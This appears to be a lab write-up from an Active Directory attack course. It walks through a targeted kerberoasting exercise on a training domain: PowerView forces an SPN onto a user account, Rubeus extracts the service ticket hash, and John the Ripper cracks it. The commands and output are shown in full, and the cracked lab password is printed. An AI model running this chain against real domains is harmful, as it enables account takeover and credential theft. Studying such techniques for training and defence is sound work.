# HANDS ON 7:

```
Determine if studentuserx has permissions to set UserAccountControl flags for any user.
If yes, force set a SPN on the user and obtain a TGS for the user.
```

## Index of content

  1. [Permissions to set UserAccountControl](#permissions-to-set-useraccountcontrol)
  2. [Force SPN and obtain TGS](#force-spn-and-obtain-tgs)


## Permissions to set UserAccountControl

```
PS C:\AD\Tools> Get-ADUser -Identity support34user -Properties *


AccountExpirationDate                :
accountExpires                       : 9223372036854775807
AccountLockoutTime                   :
AccountNotDelegated                  : False
AllowReversiblePasswordEncryption    : False
AuthenticationPolicy                 : {}
AuthenticationPolicySilo             : {}
BadLogonCount                        : 0
badPasswordTime                      : 0
badPwdCount                          : 0
CannotChangePassword                 : True
CanonicalName                        : us.techcorp.local/Users/Support34User
Certificates                         : {}
City                                 :
CN                                   : Support34User
codePage                             : 0
Company                              :
CompoundIdentitySupported            : {}
Country                              :
countryCode                          : 0
Created                              : 12/27/2022 3:29:12 AM
createTimeStamp                      : 12/27/2022 3:29:12 AM
Deleted                              :
Department                           :
Description                          :
DisplayName                          : Support34User
DistinguishedName                    : CN=Support34User,CN=Users,DC=us,DC=techcorp,DC=local
Division                             :
DoesNotRequirePreAuth                : False
dSCorePropagationData                : {12/27/2022 3:29:12 AM, 12/27/2022 3:29:12 AM, 12/31/1600 4:00:00 PM}
EmailAddress                         :
EmployeeID                           :
EmployeeNumber                       :
Enabled                              : True
Fax                                  :
GivenName                            : Support34
HomeDirectory                        :
HomedirRequired                      : False
HomeDrive                            :
HomePage                             :
HomePhone                            :
Initials                             :
instanceType                         : 4
isDeleted                            :
KerberosEncryptionType               : {}
LastBadPasswordAttempt               :
LastKnownParent                      :
lastLogoff                           : 0
lastLogon                            : 0
LastLogonDate                        :
LockedOut                            : False
logonCount                           : 0
LogonWorkstations                    :
Manager                              :
MemberOf                             : {}
MNSLogonAccount                      : False
MobilePhone                          :
Modified                             : 12/27/2022 3:29:12 AM
modifyTimeStamp                      : 12/27/2022 3:29:12 AM
msDS-User-Account-Control-Computed   : 0
Name                                 : Support34User
nTSecurityDescriptor                 : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                       : CN=Person,CN=Schema,CN=Configuration,DC=techcorp,DC=local
ObjectClass                          : user
ObjectGUID                           : 64732dd6-1019-4701-b41a-17bb3ba444fe
objectSid                            : S-1-5-21-210670787-2521448726-163245708-16124
Office                               :
OfficePhone                          :
Organization                         :
OtherName                            :
PasswordExpired                      : False
PasswordLastSet                      : 12/27/2022 3:29:12 AM
PasswordNeverExpires                 : True
PasswordNotRequired                  : False
POBox                                :
PostalCode                           :
PrimaryGroup                         : CN=Domain Users,CN=Users,DC=us,DC=techcorp,DC=local
primaryGroupID                       : 513
PrincipalsAllowedToDelegateToAccount : {}
ProfilePath                          :
ProtectedFromAccidentalDeletion      : False
pwdLastSet                           : 133166141526844847
SamAccountName                       : Support34user
sAMAccountType                       : 805306368
ScriptPath                           :
sDRightsEffective                    : 7
ServicePrincipalNames                : {}
SID                                  : S-1-5-21-210670787-2521448726-163245708-16124
SIDHistory                           : {}
SmartcardLogonRequired               : False
sn                                   : user
State                                :
StreetAddress                        :
Surname                              : user
Title                                :
TrustedForDelegation                 : False
TrustedToAuthForDelegation           : False
UseDESKeyOnly                        : False
userAccountControl                   : 66048
userCertificate                      : {}
UserPrincipalName                    : Support34user
uSNChanged                           : 2396724
uSNCreated                           : 2396719
whenChanged                          : 12/27/2022 3:29:12 AM
whenCreated                          : 12/27/2022 3:29:12 AM


```

## Force SPN and obtain TGS

Use powerView Module:
```
PS C:\AD\Tools> Import-Module C:\AD\Tools\PowerView.ps1
```
Set SPN to support34user:
```
PS C:\AD\Tools> Set-DomainObject -Identity support34user -Set @{serviceprincipalName='us/myspn34'} -Verbose
VERBOSE: [Get-DomainSearcher] search base: LDAP://US-DC.US.TECHCORP.LOCAL/DC=US,DC=TECHCORP,DC=LOCAL
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=support34user)(name=support34user)(displayname=support34user))))
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalName' to 'us/myspn34' for object 'Support34user'
```
Validate SPN for supportuser34:

```
Get-ADUser -Identity support34user -Properties ServicePrincipalName


DistinguishedName    : CN=Support34User,CN=Users,DC=us,DC=techcorp,DC=local
Enabled              : True
GivenName            : Support34
Name                 : Support34User
ObjectClass          : user
ObjectGUID           : 64732dd6-1019-4701-b41a-17bb3ba444fe
SamAccountName       : Support34user
ServicePrincipalName : {us/myspn34}
SID                  : S-1-5-21-210670787-2521448726-163245708-16124
Surname              : user
UserPrincipalName    : Support34user

```

## Force SPN and obtain TGS

Extract TGS with RUbeus:
```
C:\Users\studentuser34>C:\AD\Tools\Rubeus.exe kerberoast /user:support34user /simple /rc4opsec /outfile:support34user_spn.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1


[*] Action: Kerberoasting

[*] Using 'tgtdeleg' to request a TGT for the current user
[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else
[*] Target User            : support34user
[*] Target Domain          : us.techcorp.local
[+] Ticket successfully imported!
[*] Searching for accounts that only support RC4_HMAC, no AES
[*] Searching path 'LDAP://US-DC.us.techcorp.local/DC=us,DC=techcorp,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=support34user)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24))'

[*] Total kerberoastable users : 1

[*] Hash written to C:\Users\studentuser34\support34user_spn.txt

[*] Roasted hashes written to : C:\Users\studentuser34\support34user_spn.txt

```

Brute force attack:

```
PS C:\Users\studentuser34> C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt support34user_spn.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Desk@123         (?)
1g 0:00:00:00 DONE (2023-01-18 11:24) 83.33g/s 64000p/s 64000c/s 64000C/s password..9999
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
